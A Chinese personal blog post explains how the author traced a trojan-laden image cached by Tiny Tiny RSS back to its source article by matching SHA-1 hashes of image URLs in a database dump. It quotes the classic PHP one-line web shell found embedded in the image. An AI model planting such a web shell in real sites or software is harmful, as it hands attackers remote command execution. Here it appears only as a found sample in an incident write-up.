---
title: ttrss缓存图片与文章关联
date: 2020-03-15T23:34:01+08:00
categories: [琐碎]
---

# 背景

腾讯云发来通知说检测到服务器上有木马，通过路径得知这个木马文件是ttrss缓存的一张图片（开启rss源的媒体缓存选项后，ttrss会将图片缓存到服务器上）。图片是这个，

![](./trojan.png)

用文本编辑器打开后，会发现有这一段，经典的一句话木马语句，不过看这条语句在图片中间，不清楚是否真的能用。

```php
<?php eval($_POST("cmd"));?>
```

接下来就想找找这个图片是哪篇文章中的。

# 寻找

ttrss缓存的图片名称是个hash值，不能直接与文章关联起来。一个想法是将整个ttrss数据库dump出来，遍历所有文章的html，将hash值给找出来。

使用`pg_dump`命令dump ttrss的数据库，直接遍历查找，并未找到这张图片的hash值。

找了篇使用媒体缓存的文章仔细研究了下，发现文章html中的图片链接还是原始链接，但ttrss网站页面中看到的则是含有hash的路径，因此猜测ttrss是在渲染的时候在前端进行路径替换的。图片的名称是个hash，估计这个hash就是根据源链接计算出的hash值。找了个例子试了下，果然是对的。图片的hash值名称就是图片原始链接的sha1值。

举个例子说明下，`https://www.baidu.com/1234.png`是一篇文章中的一个图片链接，这篇文章所在的rss源设置了图片缓存，那么这张缓存下来的图片文件的名称是`https://www.baidu.com/1234.png`这个链接的sha1值，即`ed6e98935a2ada086ddc334166cb2eb1a86e3ee1`。

知道了这个原理，就可以修改程序了。代码如下，简单粗暴。

```python
import re
import hashlib
src = re.compile("src=\"(.+?)\"")

file = open("dump.sql", encoding="utf8")
for line in file:
    v = src.findall(line)
    for item in v:
        res = hashlib.sha1(item.encode()).hexdigest()
        if res == "46e4d516a9c3cc27ce4051869f63c22e93061ee3":
            print(item, line)
            break
file.close()
```

运行程序后，很快就找到了这个图片对应的文章，是某个论坛帖子中某个发言用户的头像。我也是服😢。

# 参考文章：

1. [Postgresql备份与还原命令pg_dump](https://blog.csdn.net/timo1160139211/article/details/78171272)。
